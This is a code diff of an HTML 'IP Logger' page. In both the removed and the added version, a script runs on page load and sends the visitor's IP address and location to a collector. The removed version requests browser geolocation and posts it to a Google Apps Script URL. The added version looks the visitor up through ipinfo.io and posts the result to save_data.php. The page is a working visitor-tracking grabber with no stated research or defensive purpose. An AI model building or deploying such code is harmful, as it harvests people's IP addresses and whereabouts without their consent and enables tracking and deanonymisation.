@@ -1,30 +1,27 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Location & IP Logger</title>
-    <script>
-        async function sendData() {
-            // Get IP address
-            const ipResponse = await fetch('https://api64.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            
-            // Get Geolocation
-            navigator.geolocation.getCurrentPosition(async position => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-
-                // Send data to Google Apps Script
-                fetch('https://script.google.com/macros/s/AKfycbxwypum47HfRaQBeRuCq1MssWpCcv0XGWdvP7zrUXY4CZLs4fLMYTak9CxpwnheSuM/exec', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ ip: ipData.ip, lat, lon })
-                });
-            });
-        }
-        window.onload = sendData;
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
 </head>
 <body>
-    <h1>Location & IP Logger</h1>
+    <h1>Logging IP and Location</h1>
+    <script>
+        fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const location = `${data.city}, ${data.region}, ${data.country}`;
+                console.log(`IP: ${ip}, Location: ${location}`);
+
+                // Send data to be written in another file
+                fetch('save_data.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ip: ip, location: location })
+                });
+            });
+    </script>
 </body>
 </html>
